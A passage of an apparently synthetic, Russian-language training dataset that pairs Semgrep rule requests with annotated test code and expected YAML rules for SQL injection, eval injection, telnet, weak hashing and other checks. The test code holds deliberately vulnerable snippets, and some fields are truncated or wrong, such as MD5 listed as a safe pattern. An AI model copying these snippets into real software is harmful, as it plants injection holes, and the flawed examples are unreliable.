    "instruction": "Создай Semgrep правило для: doctrine-dbal-dangerous-query\nОписание уязвимости: Detected string concatenation with a non-literal variable in a Doctrine DBAL query method. This could lead to SQL injection if the variable is user-controlled and not properly sanitized. In order to prevent SQL injection, use parameterized queries or prepared statements instead.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: doctrine-dbal-dangerous-query.php\n<?php\n\nclass ProductRepository extends ServiceEntityRepository\n{\n    public function test1(int $price): array\n    {\n        $conn = $this->getEntityManager()->getConnection();\n\n        $sql = \"SELECT * FROM product p WHERE p.price > \" . $_GET['cur_price']. \" ORDER BY p.price ASC\";\n        // ruleid: doctrine-dbal-dangerous-query\n        $stmt = $conn->prepare($sql);\n        $stmt->execute(['price' => $price]);\n\n        return $stmt->fetchAllAssociative();\n    }\n\n    public function test2(): array\n    {\n        $conn = $this->getEntityManager()->getConnection();\n\n        // ruleid: doctrine-dbal-dangerous-query\n        $query = $conn->createQuery(\"SELECT u FROM User u WHERE u.username = '\" . $_GET['username'] . \"'\");\n        $data = $query->getResult();\n        return $data;\n    }\n\n    public function okTest1(int $price): array\n    {\n        $conn = $this->getEntityManager()->getConnection();\n        $sql = \"SELECT * FROM users WHERE username = ?\";\n        // ok: doctrine-dbal-dangerous-query\n        $stmt = $conn->prepare($sql);\n        $stmt->bindValue(1, $_GET['username']);\n        $resultSet = $stmt->executeQuery();\n        return $resultSet;\n    }\n\n    public function okTest2(int $price): array\n    {\n        $conn = $this->foobar();\n        $sql = \"SELECT * FROM users WHERE username = ?\";\n        // ok: doctrine-dbal-dangerous-query\n        $stmt = $conn->prepare($sql);\n        $stmt->bindValue(1, $_GET['username']);\n        $resultSet = $stmt->executeQuery();\n        return $resultSet;\n    }\n\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• SELECT * FROM product p WHERE p.price > \n\nБезопасные паттерны:  \n• SELECT * FROM users WHERE username = ?\n• SELECT * FROM users WHERE username = ?\n\nЛегенда аннотаций:\n- // ruleid:doctrine-dbal-dangerous-query: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:doctrine-dbal-dangerous-query: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: doctrine-dbal-dangerous-query\n  languages:\n  - php\n  message: Detected string concatenation with a non-literal variable in a Doctrine DBAL query method.\n    This could lead to SQL injection if the variable is user-controlled and not properly sanitized. In\n    order to prevent SQL injection, use parameterized queries or prepared statements instead.\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://www.doctrine-project.org/projects/doctrine-dbal/en/current/reference/security.html\n    - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\n    technology:\n    - doctrine\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  patterns:\n  - pattern-either:\n    - pattern: $CONNECTION->prepare($QUERY,...)\n    - pattern: $CONNECTION->createQuery($QUERY,...)\n    - pattern: $CONNECTION->executeQuery($QUERY,...)\n  - pattern-either:\n    - pattern-inside: |\n        use Doctrine\\DBAL\\Connection;\n        ...\n    - pattern-inside: |\n        $CONNECTION = $SMTH->getConnection(...);\n        ...\n  - pattern-not: $CONNECTION->prepare(\"...\",...)\n  - pattern-not: $CONNECTION->createQuery(\"...\",...)\n  - pattern-not: $CONNECTION->executeQuery(\"...\",...)\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции в Doctrine DBAL. Оно ищет случаи, когда строка запроса создается путем конкатенации переменной, полученной извне (например, из $_GET), и литеральной строки. Такое поведение может привести к SQL-инъекции, если переменная не была должным образом очищена или параметризована. Правило использует комбинацию шаблонов, которые проверяют методы prepare, createQuery и executeQuery, а также условия NOT, исключающие ситуации, где запрос уже параметризован.\n\n# Ключевые элементы:\n- ID: doctrine-dbal-dangerous-query\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "doctrine-dbal-dangerous-query",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: dangerous-testcapi-run-in-subinterp-tainted-env-args\nОписание уязвимости: Found user controlled content in `run_in_subinterp`. This is dangerous because it allows a malicious actor to run arbitrary Python code.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-testcapi-run-in-subinterp-tainted-env-args.py\nimport sys\nimport _testcapi\nfrom test import support\n\n\ndef bad1() -> None:\n    payload = sys.argv[1]\n    # ruleid: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(payload)\n\n\ndef bad2() -> None:\n    payload = sys.argv[1]\n    # ruleid: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    support.run_in_subinterp(payload)\n\n\ndef fn1(payload: str) -> None:\n    # fn: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(payload)\n\n\ndef fn2(payload: str) -> None:\n    # fn: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    support.run_in_subinterp(payload)\n\n\ndef okTest(payload: str) -> None:\n    # ok: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(\"print('Hello world')\")  # Ограничиваем длину\n\nОпасные паттерны:\n• payload = sys.argv[1]; _testcapi.run_in_subinterp(payload)\n• payload = os.environ['VARIABLE']; _testcapi.run_in_subinterp(payload)\n\nБезопасные паттерны:  \n• okTest('fixed_payload')\n• _testcapi.run_in_subinterp('hardcoded_string')\n\nЛегенда аннотаций:\n- // ruleid:dangerous-testcapi-run-in-subinterp-tainted-env-args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-testcapi-run-in-subinterp-tainted-env-args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-testcapi-run-in-subinterp-tainted-env-args\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: os.environ\n          - pattern: os.environ.get('$FOO', ...)\n          - pattern: os.environb\n          - pattern: os.environb.get('$FOO', ...)\n          - pattern: os.getenv('$ANYTHING', ...)\n          - pattern: os.getenvb('$ANYTHING', ...)\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern-either:\n              - pattern: sys.argv\n              - pattern: sys.orig_argv\n          - patterns:\n            - pattern-inside: |\n                $PARSER = argparse.ArgumentParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-inside: |\n                $PARSER = optparse.OptionParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.getopt(...)\n                  ...\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.gnu_getopt(...)\n                  ...\n            - pattern-either:\n              - patterns:\n                - pattern-inside: |\n                    for $O, $A in $OPTS:\n                      ...\n                - pattern: $A\n              - pattern: $ARGS\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          _testcapi.run_in_subinterp($PAYLOAD, ...)\n      - pattern-inside: |\n          test.support.run_in_subinterp($PAYLOAD, ...)\n    - pattern: $PAYLOAD\n    - pattern-not: |\n        _testcapi.run_in_subinterp(\"...\", ...)\n    - pattern-not: |\n        test.support.run_in_subinterp(\"...\", ...)\n  message: >-\n    Found user controlled content in `run_in_subinterp`.\n    This is dangerous because it allows a malicious actor to run arbitrary Python code.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  severity: WARNING\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции run_in_subinterp из модуля _testcapi или test.support с потенциально загрязненным источником данных. Источники данных могут быть получены из окружения (os.environ, os.environ.get), аргументов командной строки (sys.argv, sys.orig_argv), парсинга аргументов (argparse, optparse, getopt). Синтаксис паттернов источников включает проверки на наличие этих источников внутри определенных конструкций, таких как инициализация парсера аргументов и получение аргументов. Паттерны sinkов проверяют фактическое выполнение run_in_subinterp с использованием переменной PAYLOAD, которая может быть загрязнена данными пользователя.\n\n# Ключевые элементы:\n- ID: dangerous-testcapi-run-in-subinterp-tainted-env-args\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-testcapi-run-in-subinterp-tainted-env-args",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения suppressed-exception-handling-finally-break\nОписание уязвимости: Having a `break`, `continue`, or `return` in a `finally` block will cause strange behaviors, like exceptions not being caught.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: suppressed-exception-handling-finally-break.py\ntry:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\n      break\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")\n\n\ntry:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\n      continue\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")\n\ntry:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\n      return None\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")\n\n\ntry:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\n      return\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")\n\n\ntry:\n  for i in range(3):\n    # ok: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")\n\n# ruleid: suppressed-exception-handling-finally-break\ntry:\n  print(\"hi\")\n  return \"hi\"\nfinally:\n  print(\"finally\")\n  return \"finally\"  # Ограничиваем длину\n\nОпасные паттерны:\n• try:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by \n• try:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by \n• try:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by \n\nБезопасные паттерны:  \n• try:\n  for i in range(3):\n    # ok: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero\n• # ruleid: suppressed-exception-handling-finally-break\ntry:\n  print(\"hi\")\n  return \"hi\"\nfinally:\n  print(\"finally\")\n  return \"finally\"\n\nЛегенда аннотаций:\n- // ruleid:suppressed-exception-handling-finally-break: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:suppressed-exception-handling-finally-break: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: suppressed-exception-handling-finally-break\n  patterns:\n    - pattern-either:\n      - pattern: |\n          try:\n            ...\n          except $EXCEPTION:\n            ...\n          finally:\n            ...\n            break\n      - pattern: |\n          try:\n            ...\n          except $EXCEPTION:\n            ...\n          finally:\n            ...\n            continue\n      - pattern: |\n          try:\n            ...\n          except $EXCEPTION:\n            ...\n          finally:\n            ...\n            return ...\n      - pattern: |\n          try:\n            ...\n            return ...\n          finally:\n            ...\n            return ...\n  message: >-\n      Having a `break`, `continue`, or `return` in a `finally` block will cause strange behaviors, like exceptions not being caught.\n  metadata:\n    references:\n    - https://docs.python.org/3/reference/compound_stmts.html#the-try-statement\n    - https://www.python.org/dev/peps/pep-0601/#rejection-note\n    category: 'correctness'\n    technology: \n      - python\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска кода, где инструкции break, continue или return используются внутри блока finally. Такие конструкции могут привести к неожиданному поведению программы, включая пропуск обработки исключений. Правило использует шаблонный поиск (pattern) для выявления последовательностей try-except-finally, содержащих указанные инструкции внутри finally-блока.\n\n# Ключевые элементы:\n- ID: suppressed-exception-handling-finally-break\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "suppressed-exception-handling-finally-break",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: telnet-request\nОписание уязвимости: Checks for attempts to connect through telnet. This is insecure as the telnet protocol supports no encryption, and data passes through unencrypted.\nCWE: C\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: telnet-request.java\nclass Bad {\n    public void badtelnet1() {\n        //ruleid: telnet-request\n        TelnetClient telnet = new TelnetClient();\n        telnet.connect(\"rainmaker.wunderground.com\");\n    }\n\n    public void badtelnet2() {\n        TelnetClient telnet = null;\n        //ruleid: telnet-request\n        telnet = new TelnetClient();\n        telnet.connect(\"rainmaker.wunderground.com\");\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: telnet-request.java\nclass Bad {\n    public void badtelnet1() {\n        //ruleid: telnet-request\n        TelnetClient telnet = new TelnetClient();\n        telnet.connect(\"rainmaker.wundergroun\n• // File: telnet-request.java\nclass Bad {\n    public void badtelnet2() {\n        TelnetClient telnet = null;\n        //ruleid: telnet-request\n        telnet = new TelnetClient();\n        telnet.connect\n\nБезопасные паттерны:  \n• // File: telnet-safe.java\nclass Good {\n    public void goodtelnet() {\n        SecureTelnetClient secureTelnet = new SecureTelnetClient();\n        secureTelnet.connect(\"secureserver.com\");\n    }\n}\n• // File: telnet-safe.java\nclass Good {\n    public void goodtelnet() {\n        SSHClient ssh = new SSHClient();\n        ssh.connect(\"sshserver.com\");\n    }\n}\n\nЛегенда аннотаций:\n- // ruleid:telnet-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:telnet-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: telnet-request\n  message: >-\n    Checks for attempts to connect through telnet. This is insecure as the telnet protocol supports\n    no encryption, and data passes through unencrypted.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://commons.apache.org/proper/commons-net/javadocs/api-3.6/org/apache/commons/net/telnet/TelnetClient.html\n    subcategory:\n    - vuln\n    technology:\n    - java\n    vulnerability: Insecure Transport\n  languages:\n  - java\n  pattern: |\n    $TELNETCLIENT = new TelnetClient(...);\n    ...\n    $TELNETCLIENT.connect(...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска попыток подключения через протокол telnet, который является небезопасным, так как не поддерживает шифрование и передает данные в открытом виде. Паттерн ищет создание объекта класса TelnetClient и последующий вызов метода connect().\n\n# Ключевые элементы:\n- ID: telnet-request\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "telnet-request",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения use-of-sha224\nОписание уязвимости: This code uses a 224-bit hash function, which is deprecated or disallowed in some security policies. Consider updating to a stronger hash function such as SHA-384 or higher to ensure compliance and security.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-of-sha224.java\nimport java.security.MessageDigest;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport static org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224;\n\npublic class Bad {\n  public byte[] bad1(String password) {\n    // ruleid: use-of-sha224\n    MessageDigest sha224Digest = MessageDigest.getInstance(\"SHA-224\");\n    sha224Digest.update(password.getBytes());\n    byte[] hashValue = sha224Digest.digest();\n    return hashValue;\n  }\n\n  public byte[] bad2(String password) {\n    // ruleid: use-of-sha224\n    byte[] hashValue = DigestUtils.getSha3_224Digest().digest(password.getBytes());\n    return hashValue;\n  }\n\n  public void bad3() {\n    // ruleid: use-of-sha224\n    java.security.MessageDigest md = java.security.MessageDigest.getInstance(\"sha224\", \"SUN\");\n    byte[] input = { (byte) '?' };\n    Object inputParam = bar;\n    if (inputParam instanceof String)\n      input = ((String) inputParam).getBytes();\n    if (inputParam instanceof java.io.InputStream) {\n      byte[] strInput = new byte[1000];\n      int i = ((java.io.InputStream) inputParam).read(strInput);\n      if (i == -1) {\n        response.getWriter()\n            .println(\n                \"This input source requires a POST, not a GET. Incompatible UI for the InputStream source.\");\n        return;\n      }\n      input = java.util.Arrays.copyOf(strInput, i);\n    }\n    md.update(input);\n    byte[] result = md.digest();\n    java.io.File fileTarget = new java.io.File(\n        new java.io.File(org.owasp.benchmark.helpers.Utils.TESTFILES_DIR),\n        \"passwordFile.txt\");\n    java.io.FileWriter fw = new java.io.FileWriter(fileTarget, true); // the true will append the new data\n    fw.write(\n        \"hash_value=\"\n            + org.owasp.esapi.ESAPI.encoder().encodeForBase64(result, true)\n            + \"\\n\");\n    fw.close();\n  }\n\n  public byte[] bad4(String password) {\n    // ruleid: use-of-sha224\n    byte [] hashValue = new DigestUtils(SHA_224).digest(password.getBytes());\n    return h  # Ограничиваем длину\n\nОпасные паттерны:\n• MessageDigest sha224Digest = MessageDigest.getInstance(\"SHA-224\");\n• byte[] hashValue = DigestUtils.getSha3_224Digest().digest(password.getBytes());\n• new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224)\n\nБезопасные паттерны:  \n• MessageDigest sha256Digest = MessageDigest.getInstance(\"SHA-256\");\n• byte[] hashValue = DigestUtils.getSha3_512Digest().digest(password.getBytes());\n• new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_384)\n\nЛегенда аннотаций:\n- // ruleid:use-of-sha224: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-sha224: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-sha224\n  message: >-\n    This code uses a 224-bit hash function, which is deprecated or disallowed\n    in some security policies. Consider updating to a stronger hash function such\n    as SHA-384 or higher to ensure compliance and security.\n  languages: [java]\n  severity: WARNING\n  metadata:\n    functional-categories:\n      - 'crypto::search::hash-algorithm::javax.crypto'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    category: security\n    technology:\n    - java\n    references:\n    - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar3.ipd.pdf\n    - https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-cryptography\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n  pattern-either:\n  - pattern: org.apache.commons.codec.digest.DigestUtils.getSha3_224Digest()\n  - pattern: org.apache.commons.codec.digest.DigestUtils.getSha512_224Digest()\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha3_224(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha3_224Hex(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha512_224(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha512_224Hex(...)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_512_224)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA3_224)\n  - patterns:\n    - pattern: java.security.MessageDigest.getInstance(\"$ALGO\", ...);\n    - metavariable-regex:\n        metavariable: $ALGO\n        regex: '.*224'\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования хэш-функции SHA-224, которая считается устаревшей или запрещенной в некоторых политиках безопасности. Паттерны включают явное указание SHA-224 через классы и методы Apache Commons Codec DigestUtils и Java Security MessageDigest, а также регулярные выражения для метавариабельной ALGO, содержащей строку '224'. Правило применимо только к языку Java.\n\n# Ключевые элементы:\n- ID: use-of-sha224\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-sha224",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: detect-huggingface\nОписание уязвимости: Possibly found usage of AI: HuggingFace\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-huggingface.py\n# ruleid: detect-huggingface\nfrom huggingface_hub import HfApi\n\napi = HfApi()\napi.create_repo(repo_id=\"super-cool-model\")  # Ограничиваем длину\n\nОпасные паттерны:\n• import huggingface_hub\napi = huggingface_hub.HfApi()\napi.create_repo(repo_id=\"super-cool-model\")\n• from huggingface_hub import HfApi\napi = HfApi()\napi.upload_file(path=\"./model.pt\", name=\"my_model.pt\")\n\nБезопасные паттерны:  \n• import os\nprint(os.getcwd())\n• from sklearn import linear_model\nclf = linear_model.LogisticRegression()\n\nЛегенда аннотаций:\n- // ruleid:detect-huggingface: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-huggingface: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-huggingface\n    languages:\n      - python\n    severity: INFO\n    message: \"Possibly found usage of AI: HuggingFace\"\n    pattern-either:\n      - pattern: import huggingface_hub\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных использований библиотеки Hugging Face в Python-коде. Тип анализа — поиск (search). Правило использует шаблон 'pattern' для выявления импорта модуля 'huggingface_hub'. Если импорт найден, выдается предупреждение о возможном использовании AI-моделей от Hugging Face.\n\n# Ключевые элементы:\n- ID: detect-huggingface\n- Язык: python \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-huggingface",
      "language": "python",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: bad-hexa-conversion\nОписание уязвимости: 'Integer.toHexString()' strips leading zeroes from each byte if read byte-by-byte. This mistake weakens the hash value computed since it introduces more collisions. Use 'String.format(\"%02X\", ...)' instead.\nCWE: CWE-704: Incorrect Type Conversion or Cast\nТип анализа: search\nЯзык: kt",
    "input": "Требования:\n- Язык: kt\n- Тип анализа: search\n- CWE: CWE-704: Incorrect Type Conversion or Cast\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: bad-hexa-conversion.kt\npackage testcode.crypto\n\nimport java.io.UnsupportedEncodingException\nimport java.security.MessageDigest\nimport java.security.NoSuchAlgorithmException\n\npublic class BadHexa {\n    public fun main(args: Array<String>): Void {\n        val good: String = goodHash(\"12345\")\n        val bad: String = badHash(\"12345\")\n        System.out.println(String.format(\"%s (len=%d) != %s (len=%d)\", good, good.length(), bad, bad.length()))\n    }\n\n    // ok: bad-hexa-conversion\n    public fun goodHash(password: String): String {\n        val md: MessageDigest = MessageDigest.getInstance(\"SHA-1\")\n        val resultBytes: Array<Byte> = md.digest(password.getBytes(\"UTF-8\"))\n\n        var stringBuilder: StringBuilder = StringBuilder()\n        for (b in resultBytes) {\n            stringBuilder.append(String.format(\"%02X\", b))\n        }\n\n        return stringBuilder.toString()\n    }\n\n    // ruleid: bad-hexa-conversion\n    public fun badHash(password: String): String {\n        val md: MessageDigest = MessageDigest.getInstance(\"SHA-1\")\n        val resultBytes: Array<Byte> = md.digest(password.getBytes(\"UTF-8\"))\n\n        var stringBuilder: StringBuilder = StringBuilder()\n        for (b in resultBytes) {\n            stringBuilder.append(Integer.toHexString(b and 0xFF))\n        }\n\n        return stringBuilder.toString()\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• fun badHash(password: String): String {\n  val md: MessageDigest = MessageDigest.getInstance(\"SHA-1\")\n  val resultBytes: Array<Byte> = md.digest(password.getBytes(\"UTF-8\"))\n  var stringBuilder: StringB\n• fun anotherBadHash(password: String): String {\n  val md: MessageDigest = MessageDigest.getInstance(\"SHA-256\")\n  val resultBytes: Array<Byte> = md.digest(password.getBytes(\"ISO-8859-1\"))\n  var hexStrin\n\nБезопасные паттерны:  \n• fun goodHash(password: String): String {\n  val md: MessageDigest = MessageDigest.getInstance(\"SHA-1\")\n  val resultBytes: Array<Byte> = md.digest(password.getBytes(\"UTF-8\"))\n  var stringBuilder: String\n• fun secureHash(password: String): String {\n  val md: MessageDigest = MessageDigest.getInstance(\"MD5\")\n  val resultBytes: ByteArray = md.digest(password.toByteArray())\n  return resultBytes.joinToString\n\nЛегенда аннотаций:\n- // ruleid:bad-hexa-conversion: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bad-hexa-conversion: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: bad-hexa-conversion\n  metadata:\n    cwe:\n    - 'CWE-704: Incorrect Type Conversion or Cast'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION\n    category: security\n    technology:\n    - kotlin\n    references:\n    - https://cwe.mitre.org/data/definitions/704.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  message: >-\n    'Integer.toHexString()' strips leading zeroes from each byte if read byte-by-byte.\n    This mistake weakens the hash value computed since it introduces more collisions.\n    Use 'String.format(\"%02X\", ...)' instead.\n  severity: WARNING\n  languages: [kt]\n  pattern: |-\n    fun $METHOD(...) {\n      ...\n      val $MD: MessageDigest = ...\n      ...\n      $MD.digest(...)\n      ...\n      Integer.toHexString(...)\n    }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'Integer.toHexString()' в Kotlin-коде. Метод 'Integer.toHexString()' удаляет ведущие нули при преобразовании байтов в шестнадцатеричную строку, что может привести к ослаблению хэш-значения и увеличению коллизий. Правило ищет функцию, принимающую аргументы и содержащую вызов 'MessageDigest.digest(...)', за которым следует вызов 'Integer.toHexString(...)', что указывает на потенциальную проблему.\n\n# Ключевые элементы:\n- ID: bad-hexa-conversion\n- Язык: kt \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "bad-hexa-conversion",
      "language": "kt",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
